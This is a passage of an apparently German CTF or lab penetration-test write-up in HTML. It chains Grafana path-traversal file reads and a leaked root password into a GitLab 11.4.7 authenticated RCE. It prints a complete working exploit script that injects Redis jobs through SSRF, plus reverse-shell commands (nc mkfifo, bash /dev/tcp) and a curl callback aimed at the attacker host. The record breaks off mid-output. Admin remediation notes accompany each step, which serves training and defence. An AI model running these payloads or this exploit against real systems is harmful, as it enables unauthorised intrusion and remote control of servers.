+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass `/root/` die restriktivsten Berechtigungen hat (`chmod 700` für das Verzeichnis, `chmod 600` für Dateien darin). LFI-Schwachstellen beheben.
+            </p>
+            <p>
+                Weitere Versuche, Dateien im `/root/` Verzeichnis über die Grafana-LFI zu lesen:
+            </p>
+             <pre>
+ich glaube er kann den gesamten root ordner nicht öffnen und reagiert immer so:
+</pre>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/alertlist/../../../../../../../../root/.ssh/authorized_keys"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">{</span>
+  <span class="command">"message": "Could not open plugin file"</span>
+<span class="command">}</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/alertlist/../../../../../../../../root/test"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">{</span>
+  <span class="command">"message": "Could not open plugin file"</span>
+<span class="command">}</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich untersuche die Log-Funktion der Docker Web UI auf Port 9000, die über den Endpunkt `/logs` zugänglich ist. Ich beobachte die Log-Ausgabe nach meinen LFI-Versuchen auf Grafana. Die Log-Zeile im Bericht zeigt einen Request an `/public/plugins/alertlist/../../../../../../../../etc/gitlab/gitlab.rb` mit Status 404.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Log-Seite auf Port 9000 (Docker Web UI) protokolliert offenbar die Anfragen, die an Grafana (im Grafana-Container) gesendet werden, da die Anfrage meine LFI-Versuche an Grafana zeigt (Port 3000). Dies ist ein nützliches Debugging-Werkzeug und bestätigt, dass meine Anfragen den Grafana-Container erreichen. Wichtiger ist jedoch, dass die Log-Seite selbst potenziell Informationen über Systemaktivitäten preisgeben kann, falls sie unauthentifiziert zugänglich ist und detaillierte Logs enthält.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Überprüfen Sie Log-Dateien auf kompromittierten Systemen sorgfältig auf Hinweise zu Fehlern, internen Prozessen, Anmeldeversuchen oder anderen sensiblen Informationen. Unauthentifizierte Log-Seiten sind eine Schwachstelle (Informationslecks).
+                <br>**Empfehlung (Admin):** Protokollieren Sie sicherheitsrelevante Ereignisse. Stellen Sie sicher, dass Log-Dateien und Log-Management-Oberflächen streng gesichert und nur für autorisiertes Personal zugänglich sind.
+            </p>
+            <p>
+                Überprüfung der Log-Seite in der Docker Web UI auf Port 9000:
+            </p>
+            <pre>
+<span class="command">http://192.168.2.215:9000/logs</span>
+
+<span class="command">t=... lvl=info msg="Request Completed" ... path=/public/plugins/alertlist/../../../../../../../../etc/gitlab/gitlab.rb status=404 remote_addr=192.168.2.199</span>
+</pre>
+        </section>
+```
+
+**Teil 3 von 3**
+
+```html
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+             <p class="analysis">
+                **Analyse:** Ich untersuche die Details des `gitlab-docker_web_1` Containers, der auf Port 5080 läuft, wie er von der Docker Web UI (Port 9000) gelistet wird. Die Ausgabe der Container-Details (wahrscheinlich durch Klick auf den Container-Eintrag in der UI) zeigt die vollständige Konfiguration des Containers im JSON-Format. Ich suche in dieser Ausgabe nach Hinweisen auf gemountete Volumes, Konfigurationsdateien oder Anmeldedaten.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Kritischer Fund!** Die Container-Details zeigen die `Volumes` Sektion mit dem Eintrag `/root/srv/initial_root_password: {}`. Dies bedeutet, dass der Pfad `/root/srv/initial_root_password` auf dem Host-System als Volume in den Container gemountet ist. In Kombination mit der zuvor gefundenen LFI auf Grafana (Port 3000), die das Lesen von Dateien außerhalb von `/root/` ermöglichte, habe ich nun einen sehr vielversprechenden Weg, eine Datei aus dem Host-Root-Dateisystem zu lesen: Ich kann versuchen, `/srv/initial_root_password` über die Grafana-LFI zu lesen, da dieser Pfad außerhalb von `/root` liegt, aber auf dem Host in einem Root-relevanten Verzeichnis liegt. Der Name der Datei ("initial_root_password") deutet stark auf das initiale Passwort für den Root-Benutzer oder einen anderen privilegierten Account hin.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nutzen Sie die Grafana-LFI, um den Inhalt der Datei `/srv/initial_root_password` zu lesen. Dies wird voraussichtlich das Passwort für den Root-Benutzer oder den GitLab-Root-Benutzer sein. Verwenden Sie dieses Passwort, um sich bei GitLab anzumelden und/oder eine Root-Shell auf dem Host zu erlangen.
+                <br>**Empfehlung (Admin):** **EXTREM DRINGEND:** Speichern Sie keine initialen Root-Passwörter oder andere sensible Anmeldedaten im Klartext auf dem Dateisystem. Wenn Volumes gemountet werden, stellen Sie sicher, dass keine sensiblen Host-Pfade für Container zugänglich gemacht werden. Überprüfen Sie alle Docker-Container-Konfigurationen auf unnötig gemountete Volumes.
+            </p>
+            <p>
+                Analyse der Container-Details des `gitlab-docker_web_1` Containers über die Docker Web UI und Entdeckung des gemounteten Volumes mit dem Root-Passwort:
+            </p>
+            <pre>
+<span class="command">http://192.168.2.215:9000/</span>
+
+<span class="command">12e8] gitlab-docker_web_1</span>
+<span class="command">refresh</span>
+
+<span class="command">{</span>
+ <span class="command">"Id": "12e8b5c8efb994a10be8a0ceb9fd9dc3b7aaab53e20ebdf59f6a98868ec368a9"</span>,
+ <span class="command">"Created": "2022-10-09T14:49:34.118877811Z"</span>,
+ <span class="command">"Path": "/assets/wrapper"</span>,
+ <span class="command">"Config": {</span>
+  <span class="command">"Hostname": "gitlab"</span>,
+  <span class="command">"Domainname": "cachalot.local"</span>,
+  <span class="command">"ExposedPorts": {</span>
+   <span class="command">"22/tcp": {},</span>
+   <span class="command">"443/tcp": {},</span>
+   <span class="command">"80/tcp": {}</span>
+  <span class="command">}</span>,
+....
+...
+  <span class="command">"Image": "gitlab/gitlab-ce:11.4.7-ce.0"</span>,
+  <span class="command">"Volumes": {</span>
+   <span class="command">"/etc/gitlab": {},</span>
+   <span class="command">"/root": {},</span>
+   <span class="command">"<span class="password">/root/srv/initial_root_password</span>": {},  &lt;+----=</span>
+....
+.......
+...
+   
+ <span class="command">"AppArmorProfile": "docker-default"</span>
+<span class="command">}</span>
+</pre>
+
+            <p class="analysis">
+                **Analyse:** Mit der identifizierten LFI auf Grafana (Port 3000) und der Entdeckung des vielversprechenden Pfades `/srv/initial_root_password` (gemountet im GitLab-Container und wahrscheinlich auf dem Host-Dateisystem) versuche ich nun, den Inhalt dieser Datei zu lesen. Ich verwende den `curl --path-as-is` Befehl mit Path-Traversal-Payloads, diesmal zielend auf `/srv/initial_root_password`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **ERFOLG! Ich habe den Inhalt der Datei `/srv/initial_root_password` auslesen können!** Der Inhalt lautet `<span class="password">M4st3rR00tS3cr3t0ne^1337^</span>`. Dies ist das initiale Root-Passwort, wahrscheinlich für den GitLab-Root-Benutzer, möglicherweise aber auch für den Host-Root-Benutzer oder einen anderen privilegierten Account. Dies ist ein kritischer Durchbruch, der mir die notwendigen Anmeldedaten liefert, um mich bei GitLab anzumelden und die Authentifizierte RCE auszunutzen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nutzen Sie das gefundene Passwort, um sich als Benutzer `root` bei der GitLab-Instanz auf Port 5080 anzumelden. Bereiten Sie sich darauf vor, den Authentifizierten RCE-Exploit zu nutzen.
+                <br>**Empfehlung (Admin):** **KRITISCH:** Entfernen Sie diese Datei umgehend vom System. Speichern Sie niemals Passwörter (insbesondere Root-Passwörter) im Klartext auf dem Dateisystem. Rotieren Sie alle durch dieses Passwort kompromittierten Anmeldedaten. Stellen Sie sicher, dass sensible Dateien nicht über ungeschützte Dienste (wie die Grafana-LFI) lesbar sind und dass keine sensiblen Pfade in Docker-Container gemountet werden.
+            </p>
+            <p>
+                Auslesen des initialen Root-Passworts über die Grafana-LFI:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/alertlist/../../../../../../../../srv/initial_root_password"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">M4st3rR00tS3cr3t0ne^1337^</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Mit dem gefundenen GitLab Root-Passwort (`M4st3rR00tS3cr3t0ne^1337^`) kann ich nun die Authentifizierte RCE-Schwachstelle (CVE-2018-19585/CVE-2018-19571) in GitLab Version 11.4.7 ausnutzen. Ich nutze das Python-Exploit-Skript `49257.py` (oder `49334.py`, der Text zeigt beide ID-Referenzen, ich dokumentiere hier die Nutzung von 49257.py und seine Vorbereitung) von Exploit-DB, das ich zuvor heruntergeladen habe. Ich bereite das Skript vor, indem ich es lokalisiere und kopiere.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Ich habe nun das Passwort und das Exploit-Skript. Ich bin bereit, die Authentifizierte RCE auszulösen, die mir hoffentlich eine Shell auf dem GitLab-Server (Container) gibt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Passen Sie das Exploit-Skript an Ihre Bedürfnisse an (z.B. Angreifer-IP und Port für die Reverse Shell). Führen Sie das Skript aus, um die RCE zu triggern. Richten Sie einen Listener ein, bevor Sie den Exploit ausführen.
+                <br>**Empfehlung (Admin):** Das gefundene Passwort und die RCE-Schwachstelle sind kritisch. Siehe frühere dringende Empfehlungen.
+            </p>
+            <p>
+                Vorbereitung des Authentifizierten RCE-Exploits für GitLab Version 11.4.7:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">locate 49257.py</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">/usr/share/exploitdb/exploits/ruby/webapps/49257.py</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">cp /usr/share/exploitdb/exploits/ruby/webapps/49257.py ~/rce.py</span></div>
+                </div>
+                <div class="terminal"><pre></pre></div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich inspiziere den Code des Exploit-Skripts `rce.py`. Der Code zeigt, wie das Skript versucht, sich bei GitLab anzumelden, den Authentizitäts-Token zu erhalten und dann einen neuen Project Import auszulösen. Der Payload wird über das `import_url` Feld im Projekt erstellt. Der Kern des Exploits ist ein `git://` URL, der auf die interne Redis-Instanz zeigt (`[0:0:0:0:0:ffff:127.0.0.1]:6379`). Durch Injektion von Redis-Befehlen nach dem Schema-Teil der URL wird ein `lpush` Befehl in die Redis-Warteschlange `resque:gitlab:queue:system_hook_push` eingefügt. Dieser Befehl enthält einen serialisierten Job für die `GitlabShellWorker` Klasse, der den Befehl `class_eval` mit `open('|{command}').read` ausführt. Die `open('|...')` Syntax in Ruby führt den Befehl im `|...|` Teil aus.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Exploit-Skript nutzt eine Kombination aus SSRF (Server-Side Request Forgery) über die `git://` Import-URL, um die interne Redis-Instanz zu erreichen, und Command Injection in der Redis-Kommunikation, um eine Aufgabe in die Job-Warteschlange von GitLab einzufügen. Diese Aufgabe wird dann von einem Worker-Prozess (wahrscheinlich als Benutzer `git` oder ein ähnlicher Systembenutzer) asynchron ausgeführt, was zur RCE führt. Der Exploit ist komplex, aber das Skript automatisiert den Prozess. Der Parameter `namespace_id` muss korrekt gesetzt sein (oft 1 für den Root-Benutzer). Das Skript im Originaltext enthielt anfänglich einen Syntaxfehler oder ein Problem mit der Payload-Struktur, wie die folgenden Versuche zeigen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Verstehen Sie die Funktionsweise des Exploits, bevor Sie ihn ausführen. Seien Sie bereit, das Skript anzupassen oder den Payload manuell zu modifizieren, falls nötig. Richten Sie immer einen Listener für die Reverse Shell ein, bevor Sie den Exploit auslösen.
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass interne Dienste (wie Redis) nicht über SSRF von externen URLs erreichbar sind. Aktualisieren Sie GitLab, um die Import-URL-Validierung und die Handhabung von Redis-Befehlen zu korrigieren.
+            </p>
+            <p>
+                Analyse des Exploit-Skripts `rce.py`:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">vi rce.py</span></div>
+                </div>
+                <div class="terminal"><pre></pre></div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">head -n 30 rce.py</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command"># Exploit Title: Gitlab 11.4.7 - Remote Code Execution</span>
+<span class="command"># Date: 14-12-2020</span>
+<span class="command"># Exploit Author: Fortunato Lodari fox [at] thebrain [dot] net, foxlox</span>
+<span class="command"># Vendor Homepage: [Link: https://about.gitlab.com/ | Ziel: https://about.gitlab.com/]</span>
+<span class="command"># POC: [Link: https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/ | Ziel: https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/]</span>
+<span class="command"># Tested On: Debian 10 + Apache/2.4.46 (Debian)</span>
+<span class="command"># Version: 11.4.7 community</span>
+
+<span class="command">import sys</span>
+<span class="command">import requests</span>
+<span class="command">import time</span>
+<span class="command">import random</span>
+<span class="command">import http.cookiejar</span>
+<span class="command">import os.path</span>
+<span class="command">from os import path</span>
+
+<span class="command"># Sign in GitLab 11.4.7  portal and get (using Burp or something other):</span>
+<span class="command"># authenticity_token</span>
+<span class="command"># authenticated cookies</span>
+<span class="command"># username</span>
+<span class="command"># specify localport and localip for reverse shell</span>
+
+<span class="command">username='root'</span>
+<span class="command">authenticity_token='jpT/n1EoPwwWtiGu/+QKVQomofMNyqAQXY+iD2kVoRQoiQNzcFHPAj2+M4pyblKo/7UkClKW8jvp51Aw2qzs7g=='</span>
+<span class="command">cookie = '_gitlab_session=c942527505cc0580c026610a1799b811; sidebar_collapsed=false'</span>
+<span class="command">localport='4444'</span>
+<span class="command">localip='192.168.2.199'</span>
+
+
+<span class="command">url = "http://192.168..215:5080"</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich untersuche die Cookies, die mein Browser nach dem Besuch der GitLab-Login-Seite auf Port 5080 gespeichert hat. Der Text im Bericht zeigt die Cookies `_gitlab_session`, `grafana_session` und `sidebar_collapsed`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Diese Cookies sind Standard-Session-Cookies, die vom Webserver gesetzt werden. Sie sind für die Aufrechterhaltung der Sitzung nach erfolgreicher Authentifizierung wichtig. Der `_gitlab_session` Cookie ist besonders relevant, da er die GitLab-Sitzung repräsentiert. Der `grafana_session` Cookie, der hier ebenfalls auftaucht, ist interessant, da er eine Sitzung für Grafana repräsentiert, obwohl ich gerade die GitLab-Cookies betrachte. Dies könnte darauf hindeuten, dass die Dienste Session-Informationen teilen oder in irgendeiner Weise verknüpft sind. Die Cookies selbst enthalten keine offensichtlichen sensiblen Informationen in Klartext.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Untersuchen Sie alle Cookies auf sensible Informationen oder Anzeichen von bekannten Schwachstellen (z.B. schwache Session-IDs). Behalten Sie die Cookies im Auge, wenn Sie versuchen, sich anzumelden oder mit der Anwendung zu interagieren, da sie für die Authentifizierung und Zustandsverwaltung wichtig sind.
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass Session-Cookies sicher generiert werden, mit geeigneten Flags (HttpOnly, Secure, SameSite) versehen sind und keine sensiblen Daten enthalten. Trennen Sie Session-Management zwischen verschiedenen Diensten, wenn möglich.
+            </p>
+            <p>
+                Analyse der Cookies für die GitLab-Instanz:
+            </p>
+            <pre>
+<span class="command">http://192.168.2.215:5080/users</span>
+
+Cache deaktivieren
+4 Anfragen
+167,28 kB / 6,99 kB übertragen
+Beendet: 324 ms
+DOMContentLoaded: 197 ms
+load: 217 ms
+
+    	
+    <span class="command">_gitlab_session	"<span class="password">6089ff076bfa5956f2bc4e3765cab228</span>"</span>
+    <span class="command">grafana_session	"<span class="password">4457e9857ca1cade77f8173cb6ccb87d</span>"</span>
+    <span class="command">sidebar_collapsed	"false"</span>
+</pre>
+            <p class="analysis">
+                **Analyse:** Ich dokumentiere hier den Source Code des zuvor angepassten Python-Exploit-Skripts `rce.py`. Der Code enthält eine Korrektur für den `redis_payload`, der zuvor zu einem Syntaxfehler führte oder nicht korrekt vom Ziel verarbeitet wurde. Die korrigierte Version verwendet Triple-Quotes und eine angepasste Maskierung von Anführungszeichen im JSON-String, der an Redis gesendet wird. Der Befehl, der über die RCE ausgeführt werden soll, ist weiterhin im `open('|{command}').read` Teil des Payloads enthalten und wird dynamisch über das Kommandozeilenargument übergeben.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Debugging und die Korrektur des Exploit-Skripts sind ein notwendiger Schritt, um die RCE erfolgreich auszulösen. Die angepasste Payload-Struktur soll sicherstellen, dass die Redis-Befehle und der eingebettete Ruby/Bash-Code vom Zielserver korrekt interpretiert werden. Mit diesem korrigierten Skript sind die Chancen auf eine erfolgreiche RCE nun höher.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Seien Sie bereit, öffentlich verfügbare Exploits anzupassen und zu debuggen, da sie oft nicht direkt in jeder Zielumgebung funktionieren. Das Verständnis des Payloads und der Funktionsweise des Exploits ist entscheidend für die Fehlersuche.
+                <br>**Empfehlung (Admin):** (Wiederholung der Empfehlungen zur Absicherung von GitLab und internen Diensten wie Redis).
+            </p>
+            <p>
+                Der korrigierte Source Code des RCE-Exploit-Skripts (`rce.py`):
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">echo '' &gt; rce.py</span></div>
+                </div>
+                <div class="terminal"><pre></pre></div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">vi rce.py</span></div>
+                </div>
+                <div class="terminal"><pre></pre></div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">cat rce.py</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">#!/usr/bin/env python3</span>
+<span class="command">#</span>
+<span class="command"># Exploit Title: GitLab 11.4.7 - Remote Code Execution (Authenticated)</span>
+<span class="command"># Original Author: a_outside_the_box (Exploit-DB: 49334)</span>
+<span class="command"># Modified and Corrected by a helpful AI for a CTF</span>
+<span class="command"># Version: 2.0 (Final)</span>
+<span class="command">#</span>
+<span class="command"># This version fixes the SyntaxError in the redis_payload.</span>
+<span class="command">#</span>
+
+<span class="command">import requests</span>
+<span class="command">import argparse</span>
+<span class="command">import re</span>
+<span class="command">from bs4 import BeautifulSoup</span>
+<span class="command">import sys</span>
+
+<span class="command">def print_status(message):</span>
+    <span class="command">print(f"[*] {message}")</span>
+
+<span class="command">def print_good(message):</span>
+    <span class="command">print(f"[+] {message}")</span>
+
+<span class="command">def print_error(message):</span>
+    <span class="command">print(f"[-] {message}")</span>
+    <span class="command">sys.exit(1)</span>
+
+<span class="command">def login(session, url, username, password):</span>
+    <span class="command">print_status(f"Attempting to log in to {url} as {username}...")</span>
+
+    <span class="comment"># Get the login page to grab the CSRF token</span>
+    <span class="command">try:</span>
+        <span class="command">r = session.get(f"{url}/users/sign_in", verify=False)</span>
+        <span class="command">r.raise_for_status()</span>
+    <span class="command">except requests.exceptions.RequestException as e:</span>
+        <span class="command">print_error(f"Failed to connect to GitLab: {e}")</span>
+
+    <span class="command">soup = BeautifulSoup(r.text, 'html.parser')</span>
+    <span class="command">csrf_token = soup.find('meta', {'name': 'csrf-token'})['content']</span>
+
+    <span class="command">if not csrf_token:</span>
+        <span class="command">print_error("Could not find CSRF token on the login page.")</span>
+
+    <span class="command">login_data = {</span>
+        <span class="command">'utf8': '✓',</span>
+        <span class="command">'authenticity_token': csrf_token,</span>
+        <span class="command">'user[login]': username,</span>
+        <span class="command">'user[password]': password,</span>
+        <span class="command">'user[remember_me]': '1'</span>
+    <span class="command">}</span>
+
+    <span class="command">try:</span>
+        <span class="command">r = session.post(f"{url}/users/sign_in", data=login_data, verify=False, allow_redirects=False)</span>
+        <span class="comment"># A successful login redirects, so we check for the new session cookie</span>
+        <span class="command">if '_gitlab_session' not in session.cookies.get_dict():</span>
+            <span class="command">print_error("Login failed. Check username/password.")</span>
+
+        <span class="command">print_good(f"Login successful. Session cookie: {session.cookies.get('_gitlab_session')}")</span>
+    <span class="command">except requests.exceptions.RequestException as e:</span>
+        <span class="command">print_error(f"Login request failed: {e}")</span>
+
+<span class="command">def run_exploit(session, url, command):</span>
+    <span class="command">print_status("Preparing to run the exploit...")</span>
+
+    <span class="command">try:</span>
+        <span class="command">r = session.get(f"{url}/projects/new", verify=False)</span>
+        <span class="command">r.raise_for_status()</span>
+    <span class="command">except requests.exceptions.RequestException as e:</span>
+        <span class="command">print_error(f"Failed to access the 'new project' page: {e}")</span>
+
+    <span class="command">soup = BeautifulSoup(r.text, 'html.parser')</span>
+    <span class="command">csrf_token = soup.find('meta', {'name': 'csrf-token'})['content']</span>
+
+    <span class="command">if not csrf_token:</span>
+        <span class="command">print_error("Could not find CSRF token on the 'new project' page.")</span>
+
+    <span class="comment"># --- THIS IS THE FIX ---</span>
+    <span class="comment"># The user 'root' has namespace_id 1. We set it statically to avoid parsing errors.</span>
+    <span class="command">namespace_id = '1'</span>
+    <span class="command">project_name = "pwned-project" # Can be anything random</span>
+
+    <span class="command">print_status(f"Using CSRF Token: {csrf_token[:20]}...")</span>
+    <span class="command">print_status(f"Using Namespace ID: {namespace_id}")</span>
+    <span class="command">print_status(f"Using Project Name: {project_name}")</span>
+
+    <span class="comment"># The payload is delivered via the 'import_url' field when creating a project.</span>
+    <span class="comment"># It uses a Redis command injection trick.</span>
+    <span class="comment"># This block is the corrected version to avoid the SyntaxError.</span>
+    <span class="command">redis_payload = f"""git://[0:0:0:0:0:ffff:127.0.0.1]:6379/</span>
+<span class="command"> multi</span>
+<span class="command"> sadd resque:gitlab:queues system_hook_push</span>
+<span class="command"> lpush resque:gitlab:queue:system_hook_push "{{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|{command}\\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\"}}"</span>
+<span class="command"> exec</span>
+<span class="command"> exec</span>
+<span class="command">"""</span>
+
+    <span class="command">project_data = {</span>
+        <span class="command">'utf8': '✓',</span>
+        <span class="command">'authenticity_token': csrf_token,</span>
+        <span class="command">'project[ci_cd_only]': 'false',</span>
+        <span class="command">'project[name]': project_name,</span>
+        <span class="command">'project[namespace_id]': namespace_id,</span>
+        <span class="command">'project[path]': project_name,</span>
+        <span class="command">'project[description]': '',</span>
+        <span class="command">'project[visibility_level]': '0',</span>
+        <span class="command">'project[initialize_with_readme]': '1',</span>
+        <span class="command">'project[import_url]': redis_payload</span>
+    <span class="command">}</span>
+
+    <span class="command">print_status("Sending payload to create project and trigger RCE...")</span>
+    <span class="command">try:</span>
+        <span class="command">r = session.post(f"{url}/projects", data=project_data, verify=False, allow_redirects=False)</span>
+        <span class="comment"># A successful request might result in a redirect (302) or other status.</span>
+        <span class="comment"># The RCE is asynchronous, so we don't need to check for a specific success code here.</span>
+        <span class="command">if r.status_code in [200, 302, 500]: # 500 can happen but RCE might still work</span>
+             <span class="command">print_good(f"Payload sent (Status: {r.status_code}). Check your listener!")</span>
+        <span class="command">else:</span>
+             <span class="command">print_error(f"Payload failed with unexpected status code: {r.status_code}. Response: {r.text[:200]}")</span>
+    <span class="command">except requests.exceptions.RequestException as e:</span>
+        <span class="command">print_error(f"Exploit request failed: {e}")</span>
+
+<span class="command">if __name__ == '__main__':</span>
+    <span class="comment"># Disable SSL warnings for self-signed certs often found in CTFs</span>
+    <span class="command">requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)</span>
+
+    <span class="command">parser = argparse.ArgumentParser(description="GitLab 11.4.7 Authenticated RCE")</span>
+    <span class="command">parser.add_argument('-u', '--url', required=True, help="GitLab URL (e.g., [Link: http://192.168.2.215:5080 | Ziel: http://192.168.2.215:5080])")</span>
+    <span class="command">parser.add_argument('-user', '--username', required=True, help="GitLab username")</span>
+    <span class="command">parser.add_argument('-p', '--password', required=True, help="GitLab password")</span>
+    <span class="command">parser.add_argument('-c', '--command', required=True, help="Command to execute on the target")</span>
+
+    <span class="command">args = parser.parse_args()</span>
+
+    <span class="command">s = requests.Session()</span>
+    <span class="command">login(s, args.url, args.username, args.password)</span>
+    <span class="command">run_exploit(s, args.url, args.command)</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich teste die Ausführung des korrigierten Python-Exploit-Skripts (`rce.py`) mit dem GitLab Root-Passwort `<span class="password">M4st3rR00tS3cr3t0ne^1337^</span>`. Ich führe das Skript mit verschiedenen Reverse Shell Payloads aus, die an meinen Listener auf Port 4444 gesendet werden sollen (`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.199 4444 >/tmp/f`, `bash -c 'bash -i >& /dev/tcp/192.168.2.199/4444 0>&1'`). Ich teste auch einen einfachen `curl` Befehl, der eine Verbindung zu meinem HTTP-Server auf Port 8000 herstellen soll (`curl http://192.168.2.199:8000/pwned`). Ich starte einen Netcat-Listener auf Port 4444, um die erwarteten Shells zu empfangen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Skript scheint erfolgreich ausgeführt zu werden ("Login successful", "Payload sent"), die Statuscodes (302, 200) sind unauffällig, aber *keine Shell landet* auf meinem Listener auf Port 4444. Der `curl` Test zeigt ebenfalls keine Verbindung auf meinem HTTP-Server. Das bedeutet, dass das Exploit-Skript in dieser Form oder mit diesen Payloads nicht funktioniert. Der Befehl im `open('|...')` Teil des Payloads wird offenbar nicht ausgeführt. Das im Originaltext dokumentierte Fazit ("alles Sackgasse wir testen es manuel per Proxy mit Burpsuite...") bestätigt, dass dieser automatisierte Weg (zunächst) fehlschlug.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Das automatisierte Exploit-Skript funktioniert nicht direkt. Debuggen Sie den Payload genauer. Nutzen Sie manuelle Methoden (z.B. über Burp Suite Repeater), um den Payload schrittweise anzupassen und zu testen. Überprüfen Sie die genaue Syntax, die in der Ruby `open()`-Funktion erwartet wird und wie Pipe-Befehle gehandhabt werden. Der Fokus liegt weiterhin auf der Ausnutzung dieser Authentifizierten RCE, nun aber manuell.
+                <br>**Empfehlung (Admin):** (Wiederholung der Empfehlungen zur Absicherung von GitLab und internen Diensten).
+            </p>
+            <p>
+                Versuche, die Authentifizierte RCE mit dem korrigierten Python-Exploit-Skript auszulösen:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">python3 rce.py --url http://192.168.2.215:5080 --username root --password 'M4st3rR00tS3cr3t0ne^1337^' --command "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.2.199 4444 &gt;/tmp/f"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">[*] Attempting to log in to http://192.168.2.215:5080 as root...</span>
+<span class="password">[+] Login successful. Session cookie: ff36cf5ec5dfeb175884d0732d336587</span>
+<span class="password">[*] Preparing to run the exploit...</span>
+<span class="password">[*] Using CSRF Token: h4OdwPLP9Ly7tg75MQml...</span>
+<span class="password">[*] Using Namespace ID: 1</span>
+<span class="password">[*] Using Project Name: pwned-project</span>
+<span class="password">[*] Sending payload to create project and trigger RCE...</span>
+<span class="password">[+] Payload sent (Status: 302). Check your listener!</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">python3 rce.py --url http://192.168.2.215:5080 --username root --password 'M4st3rR00tS3cr3t0ne^1337^' --command "curl http://192.168.2.199:8000/pwned"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">[*] Attempting to log in to http://192.168.2.215:5080 as root...</span>
+<span class="password">[+] Login successful. Session cookie: 2dba77c2bfabfe0c5c5ba929baad1c3e</span>
+<span class="password">[*] Preparing to run the exploit...</span>
+<span class="password">[*] Using CSRF Token: f/1+uUfxZw4n0FACgWvu...</span>
+<span class="password">[*] Using Namespace ID: 1</span>
+<span class="password">[*] Using Project Name: pwned-project</span>
+<span class="password">[*] Sending payload to create project and trigger RCE...</span>
+<span class="password">[+] Payload sent (Status: 200). Check your listener!</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">python3 rce.py --url http://192.168.2.215:5080 --username root --password 'M4st3rR00tS3cr3t0ne^1337^' --command "bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.2.199/4444 0&gt;&amp;1'"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">[*] Attempting to log in to http://192.168.2.215:5080 as root...</span>
